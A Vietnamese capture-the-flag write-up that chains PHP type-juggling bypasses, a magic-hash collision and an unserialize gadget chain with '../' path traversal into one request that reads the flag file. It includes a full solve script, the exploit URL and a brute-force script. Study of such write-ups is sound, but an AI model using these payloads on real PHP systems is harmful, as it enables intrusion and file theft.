---
title: "Ultimative PHP"
category: "Web"
tags: ["php", "type-juggling", "magic-hash", "deserialization", "array-to-string", "lfi"]
solve_date: "2026-10-10"
language: "vi"
---

# Ultimative PHP

**Flag:** `FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}`
**Dịch vụ:** `https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com`. **Artifact:** `handout.zip` (5.9 KB), chứa `src/index.php` (5862 B), `src/templates/welcome.txt` (46 B) và `flag.txt` (17 B).

## Đề bài

Trang chủ là một "cổng di trú" (`One request. Zero exceptions.`) và tự mô tả bốn điều kiện: legacy digest MD5, modern digest SHA-256, PHP portable object (profile), và strict verification. Trang `/?manual=manual/operations.php` liệt kê cùng bốn mục:

```text
<div><dt>Recovery</dt><dd>Two distinct answers with matching fingerprints</dd></div>
<div><dt>Access</dt><dd>The protected administrator access level</dd></div>
<div><dt>Compatibility</dt><dd>A code accepted by both legacy hash formats</dd></div>
<div><dt>Profile</dt><dd>A Base64url-encoded PHP profile export</dd></div>
```

Toàn bộ logic nằm trong một file `src/index.php` duy nhất, chạy trên `php:8.3-cli` với `php -S 0.0.0.0:8080 -t /var/www/html`. Trang đích in cờ bằng:

```php
echo '<p class="flag">' . htmlspecialchars((string) $profile, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</p>';
```

`flag.txt` trong handout chứa `FortID{redacted}` (17 B) — đây là placeholder do deploy script chèn bằng biến môi trường `FLAG`, không phải cờ. Đường dẫn thật trên container là `/tmp/flag`, được symlink thành `/flag`, và `entrypoint.sh` giới hạn `www-data` đọc cờ từ file đó.

## Phân tích

Bốn cổng kiểm tra và một lỗi đọc file, tất cả đều nằm trên cùng một request GET.

**Cổng 1 — `access_level`.** `index.php:128` chặn chuỗi thô, `index.php:132` lại yêu cầu giá trị đã parse:

```php
$rawQuery = $_SERVER['QUERY_STRING'] ?? '';
if (str_contains(rawurldecode($rawQuery), 'access_level')) { fail_request('The access_level parameter is protected'); }
if (($_GET['access_level'] ?? '') !== 'administrator') { fail_request('Administrator access required'); }
```

`str_contains` làm việc trên chuỗi query thô sau `rawurldecode`, còn `$_GET` đã đi qua bước chuẩn hoá tên biến của PHP: dấu cách và dấu chấm trong tên tham số bị đổi thành `_`. Vì vậy `access%20level=administrator` vừa không chứa `access_level` trong chuỗi thô, vừa tạo đúng `$_GET['access_level'] = 'administrator'`.

**Cổng 2 — `primary` / `backup`.** `index.php:136-159` yêu cầu hai tham số khác nhau nhưng có cùng SHA-256:

```php
if (get_debug_type($primary) !== get_debug_type($backup)) { ... }
if ($primary === $backup) { ... }
$primaryMaterial = 'legacy-recovery:v1:' . $primary;
$backupMaterial  = 'legacy-recovery:v1:' . $backup;
if (!hash_equals($primaryHash, $backupHash)) { ... }
```

Ép hai mảng thành chuỗi cho ra `"Array"` như nhau, nên `primary[]=1&backup[]=2` là hai mảng khác nhau (`===` false, cùng `get_debug_type` = `array`) nhưng cho digest giống hệt nhau. Đây là kiểu đối chiếu mà `hash_equals` không phát hiện được, vì hai chuỗi đầu vào của nó đã bằng nhau từ trước khi băm.

**Cổng 3 — magic hash.** `index.php:167-176`:

```php
$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);
if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) { ... }
```

Cần hai digest khác nhau theo `!==` nhưng bằng nhau theo phép so sánh yếu `==`: một cặp toàn số sau `0e`, tức cả hai được PHP đọc dạng khoa học và coi bằng 0. Với prefix cố định `ULTIMATIVE-PHP-2026:`, lời giải được tìm bằng brute force cục bộ trên `code`, điều kiện `md5[:9]` và `sha256[:9]` đều khớp `0e\d{7}` và khác nhau. `code=59036305` thoả:

```text
md5[:9]   = 0e3791209
sha256[:9]= 0e9920675
```

**Cổng 4 — chuỗi POP và lỗi `strpos`.** `index.php:190-196` unserialize với allowlist hai class, bắt buộc kết quả là `MigratedProfile`:

```php
$profile = @unserialize($serializedProfile, ['allowed_classes' => [MigratedProfile::class, LegacyTemplate::class]]);
if (!$profile instanceof MigratedProfile) { fail_request('Unsupported profile type'); }
```

`(string) $profile` gọi `MigratedProfile::__toString()` (dòng 9-12), hàm này lại cast `$this->displayName`, nên đặt `displayName` là một `LegacyTemplate` sẽ gọi `LegacyTemplate::__toString()` (dòng 19-29):

```php
if (strpos($this->template, '../')) { return '[invalid template]'; }
$path = __DIR__ . '/templates/' . $this->template;
$contents = file_get_contents($path);
```

`strpos` trả `0` khi chuỗi **bắt đầu** bằng `../`, và `0` là falsy, nên chuỗi thông qua. `__DIR__` là `/var/www/html`, do đó `../../../../tmp/flag` (đúng bốn cấp) về `/tmp/flag`. Không có `basename`, không có tiền tố bị loại, và `file_get_contents` đọc toàn bộ file.

Cổng `manual` (`index.php:80-101`) dùng `str_contains($manual, '../')` trên chính giá trị đã decode, nên mẹo `strpos` ở trên không áp dụng được cho nó; `manual` chỉ cho phép đọc file có hậu tố `.php` và là đường dẫn hữu ích duy nhất cho recon nguồn.

## Lời giải

Ghép cả bốn cổng vào một GET. Chuỗi serialize cần dựng:

```text
O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:20:"../../../../tmp/flag";}}
```

Base64url không padding của chuỗi đó là `profile` trong URL. Script tái hiện đầy đủ:

```python
import base64, json, subprocess, sys, urllib.request, urllib.error

BASE = "https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com/"
CODE = "59036305"

def b64url(s: str) -> str:
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

def get(query):
    req = urllib.request.Request(BASE + "?" + query, headers={"User-Agent": "curl/8"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, "ERR " + repr(e)

def s(t: str) -> str:
    return 's:%d:"%s";' % (len(t.encode()), t)

def legacy(template):
    body = 's:8:"template";' + s(template)
    return 'O:14:"LegacyTemplate":1:' + '{' + body + '}'

def profile(template=None):
    if template is None:
        inner = s("guest")
    else:
        inner = legacy(template)
    return 'O:15:"MigratedProfile":1:' + '{s:11:"displayName";' + inner + '}'

if __name__ == "__main__":
    template = None if len(sys.argv) < 2 else sys.argv[1]
    ser = profile(template)
    q = ("access%20level=administrator"
         "&primary[]=1&backup[]=2"
         "&code=" + CODE +
         "&profile=" + b64url(ser))
    st, body = get(q)
    print("QUERY:", q)
    print("STATUS:", st)
    print(body)
```

Kiểm chứng từng cổng một theo thứ tự tăng dần độ khó, trước khi đọc cờ. Trên instance thật, `../../../../etc/hostname` trả đúng hostname container:

```text
../../../../etc/hostname => app
```

rồi chuyển sang đường đọc cờ:

```text
../../../../tmp/flag => FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}
```

URL cuối cùng (đã lưu nguyên văn trong phiên giải):

```text
https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com/?access%20level=administrator&primary[]=1&backup[]=2&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ
```

Một request `curl` riêng lẻ xác nhận đúng một lần nữa bằng cách chỉ lấy dòng cờ trong HTML:

```console
$ curl -s 'https://ultimative-php-a024a2300cb7.inst13.ctf.fortid.com/?access%20level=administrator&primary[]=1&backup[]=2&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MjA6Ii4uLy4uLy4uLy4uL3RtcC9mbGFnIjt9fQ' | grep -o '<p class="flag">[^<]*'
<p class="flag">FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}
```

Brute force magic hash chạy hoàn toàn cục bộ, không phụ thuộc instance:

```python
import hashlib, itertools, os, sys
from multiprocessing import Pool

PREFIX = b'ULTIMATIVE-PHP-2026:'

def md5_magic(s):
    return s[0:1] == b'0' and s[1:2] == b'e' and all(48 <= c <= 57 for c in s[2:9])

def worker(args):
    start, stop = args
    n = start
    while n < stop:
        code = str(n).encode()
        m = hashlib.md5(PREFIX + code).hexdigest()[:9]
        if md5_magic(m.encode()):
            s = hashlib.sha256(PREFIX + code).hexdigest()[:9]
            if md5_magic(s.encode()) and m != s:
                return (n, m, s)
        n += 1
    return None

if __name__ == '__main__':
    lo = int(sys.argv[1]); hi = int(sys.argv[2]); tasks = int(os.cpu_count() or 4)
    step = (hi - lo) // tasks
    chunks = [(lo + i * step, lo + (i + 1) * step if i < tasks - 1 else hi) for i in range(tasks)]
    with Pool(tasks) as p:
        for r in p.imap_unordered(worker, chunks):
            if r:
                print('FOUND', r[0], 'md5=', r[1], 'sha256=', r[2], flush=True)
```

```text
FOUND 59036305 md5= 0e3791209 sha256= 0e9920675
```

## Kết quả

```text
FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_fd7740fcb6}
```

Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.

## Tái hiện

Cần Python 3 (`hashlib`, `urllib`, `base64`, `multiprocessing`). Phần dựng payload và brute force chạy cục bộ; chỉ các request đọc `etc/hostname` và `tmp/flag` cần instance đang sống.

Tuỳ chọn, dựng lại môi trường bằng Docker theo handout:

```console
$ unzip handout.zip
$ cd ultimative_php
$ docker build -t ultimative-php -f deploy/Dockerfile .
$ docker run --rm -p 8080:8080 --tmpfs /tmp:rw,noexec,nosuid,nodev,size=1m -e 'FLAG=FortID{local_not_real}' ultimative-php
```

Lưu block Python đầu tiên thành `solve.py` (sửa `BASE` trỏ tới instance hoặc `http://127.0.0.1:8080/`), lưu block Python thứ hai thành `brute.py`, rồi:

```console
$ python3 brute.py 0 200000000
$ python3 solve.py '../../../../etc/hostname'
$ python3 solve.py '../../../../tmp/flag'
```

Bốn cổng chỉ được thiết kế để qua cùng lúc; thiếu một trong bốn sẽ trả về `fail_request` với thông báo tương ứng (`The access_level parameter is protected`, `Both recovery answers are required`, `Recovery fingerprints do not match`, `The compatibility code was rejected`, `Unsupported profile type`).
